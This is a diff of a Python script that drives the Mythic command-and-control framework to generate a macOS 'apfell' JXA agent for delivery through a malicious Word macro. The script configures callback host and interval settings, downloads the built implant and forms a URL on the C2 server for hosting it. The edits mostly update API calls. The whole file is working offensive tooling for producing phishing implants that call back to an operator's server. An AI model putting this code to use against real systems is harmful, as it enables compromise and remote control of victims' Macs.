@@ -9,13 +9,13 @@ from Settings.MythicSettings import *
 
 def macro_word():
     payload = "./Payloads/MacroWord_Payload"
-    #url = mythic_payload_url + "/Word_Macro.js"   # Used for where the JXA paylaod is hosted
+    #url = mythic_payload_url + "/Word_Macro.js"   # Used for where the JXA payload is hosted
 
     os.mkdir(payload,0o775)  
 
     ## Create apfell payload
     async def scripting():
-        mythic = Mythic(
+        mythic = mythic_rest.Mythic(
             username=mythic_username,
             password=mythic_password,
             server_ip=mythic_server_ip,
@@ -27,18 +27,19 @@ def macro_word():
         await mythic.login()
         await mythic.set_or_create_apitoken()
         # define what our payload should be
-        p = Payload(
+        p = mythic_rest.Payload(
             # what payload type is it
             payload_type="apfell", 
             # define non-default c2 profile variables
             c2_profiles={
-                "HTTP":[
+                "http":[
                         {"name": "callback_host", "value": mythic_http_callback_host},
                         {"name": "callback_interval", "value": mythic_http_callback_interval}
                     ]
                 },
             # give our payload a description if we want
             tag="Word Macro",
+            selected_os="macOS",
             # if we want to only include specific commands, put them here:
             #commands=["cmd1", "cmd2", "cmd3"],
             # what do we want the payload to be called
@@ -52,9 +53,9 @@ def macro_word():
         # Print the resposne
         #await json_print(resp)
 
-        payloadDownloadid = resp.response.file_id.agent_file_id 
-
-        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location
+        payloadDownloadid = resp.response.file["agent_file_id"]
+        
+        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location or comment out and use one above
 
         #Download Payload 
         payload_contents = await mythic.download_payload(resp.response)
@@ -85,7 +86,7 @@ def macro_word():
         await scripting()
         try:
             while True:
-                pending = asyncio.all_tasks()
+                pending = mythic_rest.asyncio.all_tasks()
                 plist = []
                 for p in pending:
                     if p._coro.__name__ != "main" and p._state == "PENDING":
@@ -93,11 +94,11 @@ def macro_word():
                 if len(plist) == 0:
                     exit(0)
                 else:
-                    await asyncio.gather(*plist)
+                    await mythic_rest.asyncio.gather(*plist)
         except KeyboardInterrupt:
-            pending = asyncio.all_tasks()
+            pending = mythic_rest.asyncio.all_tasks()
             for t in pending:
                 t.cancel()    
 
-    loop = asyncio.get_event_loop()
+    loop = mythic_rest.asyncio.get_event_loop()
     loop.run_until_complete(main())
